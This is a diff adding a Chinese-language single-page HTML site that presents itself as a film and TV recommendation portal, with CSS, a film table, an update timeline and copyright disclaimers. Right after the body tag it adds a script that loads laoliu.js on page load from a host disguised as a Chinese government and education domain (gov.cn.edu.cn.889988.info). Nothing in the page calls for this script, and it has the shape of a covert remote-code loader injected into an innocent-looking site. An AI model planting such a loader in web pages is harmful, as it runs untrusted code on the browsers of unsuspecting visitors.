@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视系统 - 影视推荐与资讯导航平台</title>
+<meta name="description" content="影视系统(yingshixitong-h5.github.io)是一个专业的影视推荐与资讯导航单页，提供电影、剧集、纪录片分类浏览，移动端自适应，不提供播放入源。">
+<meta name="keywords" content="影视系统, yingshixitong, 影视推荐, 影视导航, 电影资讯, 剧集盘点">
+<style>
+/* ========== 全局 ========== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+  font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif; 
+  background: #f5f7fa; 
+  color: #333; 
+  line-height: 1.6; 
+  overflow-x: hidden; 
+}
+a { text-decoration: none; color: inherit; }
+
+/* ========== 布局框架 ========== */
+.app { display: flex; min-height: 100vh; }
+
+/* ========== 栏目1：左侧固定侧边栏 ========== */
+.sidebar { 
+  width: 240px; 
+  background: #1e3a5f; 
+  color: #fff; 
+  position: fixed; 
+  top: 0; 
+  bottom: 0; 
+  left: 0; 
+  overflow-y: auto; 
+  z-index: 100; 
+  transition: transform .3s; 
+}
+.sidebar .logo { 
+  padding: 1.5rem; 
+  font-size: 1.5rem; 
+  font-weight: 900; 
+  letter-spacing: 1px; 
+  border-bottom: 1px solid rgba(255,255,255,0.1); 
+}
+.sidebar .logo span { color: #4a90d9; }
+.nav-menu { padding: 1rem 0; }
+.nav-menu a { 
+  display: block; 
+  padding: .8rem 1.5rem; 
+  color: rgba(255,255,255,0.8); 
+  transition: all .3s; 
+  font-size: .95rem; 
+}
+.nav-menu a:hover, .nav-menu a.active { 
+  background: rgba(255,255,255,0.1); 
+  color: #fff; 
+  border-left: 4px solid #4a90d9; 
+}
+
+/* ========== 主内容区 ========== */
+.main { 
+  margin-left: 240px; 
+  flex: 1; 
+  min-width: 0; 
+}
+
+/* ========== 栏目2：首屏 Hero ========== */
+.hero { 
+  background: linear-gradient(135deg, #1e3a5f 0%, #4a90d9 100%); 
+  color: #fff; 
+  padding: 4rem 2rem; 
+  text-align: center; 
+}
+.hero h1 { 
+  font-size: 2.8rem; 
+  margin-bottom: 1rem; 
+  letter-spacing: 2px;
+}
+.hero p { 
+  font-size: 1.1rem; 
+  max-width: 600px; 
+  margin: 0 auto 2rem; 
+  opacity: .9; 
+}
+.hero-btn { 
+  display: inline-block; 
+  background: #fff; 
+  color: #1e3a5f; 
+  padding: .8rem 2rem; 
+  border-radius: 50px; 
+  font-weight: 700; 
+  transition: .3s; 
+}
+.hero-btn:hover { 
+  transform: translateY(-3px); 
+  box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
+}
+
+/* ========== 栏目3：系统模块 Grid ========== */
+.modules { 
+  padding: 3rem 2rem; 
+  max-width: 1200px; 
+  margin: auto; 
+}
+.section-title { 
+  font-size: 1.6rem; 
+  color: #1e3a5f; 
+  margin-bottom: 2rem; 
+  padding-left: 1rem; 
+  border-left: 4px solid #4a90d9; 
+}
+.grid-3 { 
+  display: grid; 
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+  gap: 1.5rem; 
+}
+.module-card { 
+  background: #fff; 
+  border-radius: 10px; 
+  padding: 2rem; 
+  box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
+  transition: .3s; 
+}
+.module-card:hover { 
+  transform: translateY(-5px); 
+  box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+}
+.module-icon { 
+  width: 50px; 
+  height: 50px; 
+  background: #e8f0fe; 
+  border-radius: 10px; 
+  display: flex; 
+  align-items: center; 
+  justify-content: center; 
+  font-size: 1.5rem; 
+  margin-bottom: 1rem; 
+}
+.module-card h3 { 
+  font-size: 1.2rem; 
+  color: #1e3a5f; 
+  margin-bottom: .5rem; 
+}
+.module-card p { 
+  font-size: .9rem; 
+  color: #666; 
+}
+
+/* ========== 栏目4：影视库表格 ========== */
+.list-section { 
+  padding: 3rem 2rem; 
+  max-width: 1200px; 
+  margin: auto; 
+}
+.list-table { 
+  width: 100%; 
+  border-collapse: collapse; 
+  background: #fff; 
+  border-radius: 10px; 
+  overflow: hidden; 
+  box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
+}
+.list-table th { 
+  background: #1e3a5f; 
+  color: #fff; 
+  padding: 1rem; 
+  text-align: left; 
+  font-weight: 600; 
+}
+.list-table td { 
+  padding: 1rem; 
+  border-bottom: 1px solid #eee; 
+  font-size: .95rem; 
+}
+.list-table tr:hover td { background: #f8fafc; }
+.status { 
+  padding: .2rem .8rem; 
+  border-radius: 20px; 
+  font-size: .8rem; 
+}
+.status.hot { background: #fff0f0; color: #e74c3c; }
+.status.new { background: #e8f0fe; color: #4a90d9; }
+.status.end { background: #f0f0f0; color: #999; }
+
+/* ========== 栏目5：资讯时间线 ========== */
+.news-section { 
+  padding: 3rem 2rem; 
+  max-width: 1200px; 
+  margin: auto; 
+}
+.timeline { 
+  position: relative; 
+  padding-left: 2rem; 
+  border-left: 2px solid #4a90d9; 
+}
+.timeline-item { 
+  position: relative; 
+  margin-bottom: 2rem; 
+  padding-left: 1.5rem; 
+}
+.timeline-item::before { 
+  content: ''; 
+  position: absolute; 
+  left: -2.35rem; 
+  top: .3rem; 
+  width: 12px; 
+  height: 12px; 
+  background: #4a90d9; 
+  border-radius: 50%; 
+}
+.timeline-date { 
+  font-size: .85rem; 
+  color: #4a90d9; 
+  margin-bottom: .3rem; 
+}
+.timeline-content h3 { 
+  font-size: 1.1rem; 
+  color: #1e3a5f; 
+  margin-bottom: .5rem; 
+}
+.timeline-content p { 
+  font-size: .9rem; 
+  color: #666; 
+}
+
+/* ========== 栏目6：关于 ========== */
+.about { 
+  background: #fff; 
+  padding: 3rem 2rem; 
+  text-align: center; 
+  border-top: 1px solid #eee; 
+}
+.about-in { max-width: 700px; margin: auto; }
+.about h2 { 
+  font-size: 1.8rem; 
+  color: #1e3a5f; 
+  margin-bottom: 1rem; 
+}
+.about p { 
+  color: #666; 
+  margin-bottom: 1rem; 
+}
+.about .hl { color: #4a90d9; font-weight: 700; }
+
+/* ========== 页脚 ========== */
+footer { 
+  background: #1e3a5f; 
+  color: rgba(255,255,255,0.7); 
+  text-align: center; 
+  padding: 2rem; 
+  font-size: .85rem; 
+}
+footer a { color: #4a90d9; }
+.disclaim { 
+  max-width: 680px; 
+  margin: .8rem auto 0; 
+  font-size: .72rem; 
+  color: rgba(255,255,255,0.5); 
+  line-height: 1.6; 
+}
+
+/* ========== 移动端自适应 ========== */
+@media (max-width: 768px) {
+  .sidebar { transform: translateX(-100%); }
+  .sidebar.open { transform: translateX(0); }
+  .main { margin-left: 0; }
+  .hero h1 { font-size: 2rem; }
+  .list-table { font-size: .85rem; }
+  .list-table th, .list-table td { padding: .6rem; }
+  .menu-toggle { 
+    display: block; 
+    position: fixed; 
+    top: 1rem; 
+    left: 1rem; 
+    z-index: 200; 
+    background: #1e3a5f; 
+    color: #fff; 
+    border: none; 
+    padding: .5rem .8rem; 
+    border-radius: 5px; 
+    cursor: pointer; 
+    font-size: 1.2rem;
+  }
+}
+@media (min-width: 769px) {
+  .menu-toggle { display: none; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button>
+<div class="app">
+  <!-- 侧边栏 -->
+  <aside class="sidebar">
+    <div class="logo">影视<span>系统</span></div>
+    <nav class="nav-menu">
+      <a href="#" class="active">首页</a>
+      <a href="#modules">系统模块</a>
+      <a href="#list">影视库</a>
+      <a href="#news">更新资讯</a>
+      <a href="#about">关于系统</a>
+    </nav>
+  </aside>
+
+  <!-- 主内容 -->
+  <div class="main">
+    <!-- 首屏 -->
+    <section class="hero">
+      <h1>影视系统</h1>
+      <p>一个专业的影视推荐与资讯导航平台，提供电影、剧集、纪录片分类浏览，不提供播放入源，仅做内容导航。</p>
+      <a href="#modules" class="hero-btn">探索系统</a>
+    </section>
+
+    <!-- 系统模块 -->
+    <section class="modules" id="modules">
+      <h2 class="section-title">系统模块</h2>
+      <div class="grid-3">
+        <div class="module-card">
+          <div class="module-icon">🎬</div>
+          <h3>电影推荐</h3>
+          <p>按类型、年份、评分筛选高分电影，提供详细资讯与观看建议。</p>
+        </div>
+        <div class="module-card">
+          <div class="module-icon">📺</div>
+          <h3>剧集导航</h3>
+          <p>热门剧集分类整理，更新状态实时跟踪，方便追剧规划。</p>
+        </div>
+        <div class="module-card">
+          <div class="module-icon">📊</div>
+          <h3>数据分析</h3>
+          <p>影视榜单、票房数据、口碑趋势，用数据辅助观影选择。</p>
+        </div>
+        <div class="module-card">
+          <div class="module-icon">🔍</div>
+          <h3>智能搜索</h3>
+          <p>快速检索影片信息，支持模糊匹配与多条件筛选。</p>
+        </div>
+        <div class="module-card">
+          <div class="module-icon">📝</div>
+          <h3>影评资讯</h3>
+          <p>最新影视资讯、深度影评、行业动态，保持更新。</p>
+        </div>
+        <div class="module-card">
+          <div class="module-icon">⚙️</div>
+          <h3>系统设置</h3>
+          <p>个性化偏好设置，自定义首页模块与推荐权重。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 影视库 -->
+    <section class="list-section" id="list">
+      <h2 class="section-title">影视库</h2>
+      <table class="list-table">
+        <thead>
+          <tr><th>片名</th><th>类型</th><th>年份</th><th>状态</th><th>操作</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>奥本海默</td><td>剧情/传记</td><td>2023</td><td><span class="status hot">热门</span></td><td><a href="#">详情 #</a></td></tr>
+          <tr><td>繁城之下</td><td>悬疑/古装</td><td>2023</td><td><span class="status new">最新</span></td><td><a href="#">详情 #</a></td></tr>
+          <tr><td>流浪地球2</td><td>科幻/冒险</td><td>2023</td><td><span class="status hot">热门</span></td><td><a href="#">详情 #</a></td></tr>
+          <tr><td>漫长的季节</td><td>悬疑/剧情</td><td>2023</td><td><span class="status end">完结</span></td><td><a href="#">详情 #</a></td></tr>
+          <tr><td>封神第一部</td><td>奇幻/动作</td><td>2023</td><td><span class="status new">最新</span></td><td><a href="#">详情 #</a></td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- 资讯时间线 -->
+    <section class="news-section" id="news">
+      <h2 class="section-title">更新资讯</h2>
+      <div class="timeline">
+        <div class="timeline-item">
+          <div class="timeline-date">2026-10-22</div>
+          <div class="timeline-content">
+            <h3>系统新增「纪录片」分类模块</h3>
+            <p>影视系统现已支持纪录片分类浏览，涵盖自然、历史、人文等子类。</p>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-date">2026-10-20</div>
+          <div class="timeline-content">
+            <h3>影视库数据更新至2026年Q3</h3>
+            <p>新增影片条目1200+，更新评分与简介信息。</p>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-date">2026-10-18</div>
+          <div class="timeline-content">
+            <h3>优化移动端侧边栏交互</h3>
+            <p>移动端新增汉堡菜单，提升小屏浏览体验。</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 关于 -->
+    <section class="about" id="about">
+      <div class="about-in">
+        <h2>关于影视系统</h2>
+        <p>欢迎访问 <span class="hl">影视系统</span>（https://yingshixitong-h5.github.io），这是一个静态单页影视推荐导航站点，模拟系统界面风格，提供影视资讯整理。</p>
+        <p>本站不提供在线播放入源，不存储视听文件，不聚合第三方资源。核心关键词：<span class="hl">影视系统</span> · yingshixitong · 电影推荐 · 剧集导航。</p>
+      </div>
+    </section>
+
+    <!-- 页脚 -->
+    <footer>
+      <p>© 2026 影视系统 yingshixitong-h5.github.io</p>
+      <p>网址：<a href="https://yingshixitong-h5.github.io">https://yingshixitong-h5.github.io</a></p>
+      <p class="disclaim">本页为影视推荐导航示例，不存储视听文件、不提供未授权播放入源；若实际建站涉及互联网视听节目传播，请按属地广电与版权要求办理相应许可。</p>
+    </footer>
+  </div>
+</div>
+
+</body>
+</html>
